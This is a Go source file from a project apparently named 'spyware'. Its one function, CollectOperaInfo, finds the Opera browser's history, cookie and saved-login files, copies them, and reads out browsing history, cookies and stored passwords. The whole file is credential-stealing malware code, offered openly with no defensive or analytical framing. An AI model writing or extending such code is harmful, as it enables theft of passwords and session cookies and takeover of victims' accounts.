package collectors

import (
	"github.com/Nevesto/spyware/browsers/opera"
	"github.com/Nevesto/spyware/models"
)

func CollectOperaInfo() models.OperaInfo {
	var info models.OperaInfo

	historyFile, err := opera.FindHistoryFile()
	if err == nil && historyFile != "" {
		tmpHistoryFile, err := opera.CopyFile(historyFile)
		if err == nil {
			info.History, _ = opera.ReadHistory(tmpHistoryFile)
		}
	}

	cookieFile, err := opera.FindCookieFile()
	if err == nil && cookieFile != "" {
		tmpCookieFile, err := opera.CopyFile(cookieFile)
		if err == nil {
			info.Cookies, _ = opera.ReadCookies(tmpCookieFile)
		}
	}

	loginDataFile, err := opera.FindLoginDataFile()
	if err == nil && loginDataFile != "" {
		info.Passwords, _ = opera.ReadPasswords(loginDataFile)
	}

	return info
}
